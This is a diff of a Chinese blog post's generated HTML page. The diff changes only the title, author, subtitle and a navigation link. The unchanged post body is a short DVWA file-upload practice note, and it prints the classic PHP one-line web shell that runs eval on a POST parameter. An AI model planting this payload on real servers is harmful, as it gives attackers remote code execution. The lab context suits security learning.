@@ -15,9 +15,9 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="description" content="">
-  <meta name="author" content="booom">
+  <meta name="author" content="302">
   <meta name="keywords" content="">
-  <title>命令上传漏洞利用 - wiki</title>
+  <title>文件上传漏洞利用 - 302</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -150,12 +150,14 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
+		 style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="container page-header text-center fade-in-up">
             <span class="h2" id="subtitle">
+              
+                文件上传漏洞利用
               
             </span>
 
@@ -217,11 +219,11 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">命令上传漏洞利用</h1>
+            <h1 style="display: none">文件上传漏洞利用</h1>
             
             <div class="markdown-body" id="post-body">
               <p>之前的测试没做完，先做一点。(っ °Д °;)っ</p>
-<h2 id="命令上传漏洞利用"><a href="#命令上传漏洞利用" class="headerlink" title="命令上传漏洞利用"></a>命令上传漏洞利用</h2><p>练习dvwa中的文件上传漏洞，想着把之前的一句话木马拿过来用，发现之前做的时候没留下痕迹，\┑(￣Д ￣)┍于是从网上找一句话木马再测试一下。</p>
+<h2 id="文件上传漏洞利用"><a href="#文件上传漏洞利用" class="headerlink" title="文件上传漏洞利用"></a>文件上传漏洞利用</h2><p>练习dvwa中的文件上传漏洞，想着把之前的一句话木马拿过来用，发现之前做的时候没留下痕迹，\┑(￣Д ￣)┍于是从网上找一句话木马再测试一下。</p>
 <p>最简单的一句话木马。</p>
 <pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">'shell'</span>]);<span class="hljs-meta">?&gt;</span></span></code></pre>
 
@@ -291,7 +293,7 @@
                     
                     
                       <a href="/2020/05/04/linux-3/">
-                        <span class="hidden-mobile">Linux中的nc命令和scp命令</span>
+                        <span class="hidden-mobile">Linux中常用命令</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -481,24 +483,6 @@
   </script>
 
 
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "命令上传漏洞利用&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
 
 
 
